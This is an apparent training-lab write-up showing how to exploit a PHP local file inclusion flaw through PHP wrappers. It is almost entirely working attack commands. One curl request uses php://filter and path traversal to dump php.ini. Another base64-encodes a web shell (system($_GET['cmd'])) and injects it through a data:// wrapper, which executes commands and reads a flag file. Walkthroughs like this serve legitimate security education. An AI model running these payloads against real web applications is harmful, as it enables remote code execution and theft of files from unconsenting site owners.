# PHP Wrappers

#### Try to gain RCE using one of the PHP wrappers and read the flag at /

**Step 1** - Check if **allow\_url\_include** is on:

* Capture the **php.ini** file:
  * {% code overflow="wrap" %}
    ```bash
    curl "http://SERVER_IP:SERVER_PORT/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    ```
    {% endcode %}
* Copy the base64 string (W1BIUF0KCjs7Ozs7Ozs7O ...SNIP ... 4dGVuc2lvbj1leHBlY3QK) to a file
* Look for the allow\_url\_file with the command `cat curl.txt | base64 -d | grep allow_url_include`

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Remote Code Execution:

* Base64 encode a PHP web shell:
  * {% code overflow="wrap" %}
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64

    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
    ```
    {% endcode %}
* Test the web shell:
  * {% code overflow="wrap" %}
    ```bash
    curl -s 'http://SERVER_IP:SERVER_PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

* Look for the flag on the / directory:
  * {% code overflow="wrap" %}
    ```bash
    curl -s 'http://SERVER_IP:SERVER_PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20../../../../'
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

* Retrieve the flag:
  * {% code overflow="wrap" %}
    ```bash
    curl -s 'http://SERVER_IP:SERVER_PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20../../../37809e2f8952f06139011994726d9ef1.txt'
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

And we got the flag!
